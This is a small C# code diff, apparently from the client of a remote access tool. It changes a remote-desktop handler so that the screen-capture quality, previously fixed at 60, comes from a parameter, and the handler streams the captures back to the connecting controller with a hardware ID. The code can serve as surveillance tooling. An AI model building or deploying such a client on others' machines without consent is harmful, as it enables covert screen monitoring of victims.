@@ -15,7 +15,7 @@ namespace Client.Handle_Packet
 {
    public class HandleRemoteDesktop
     {
-        public void CaptureAndSend()
+        public void CaptureAndSend(int quality)
         {
             try
             {
@@ -23,7 +23,7 @@ namespace Client.Handle_Packet
                 Client.Connect(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[1]));
 
                 string hwid = Methods.HWID();
-                IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(60);
+                IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(quality);
                 while (Client.Connected)
                 {
                     if (!ClientSocket.Client.Connected || !ClientSocket.IsConnected) break;
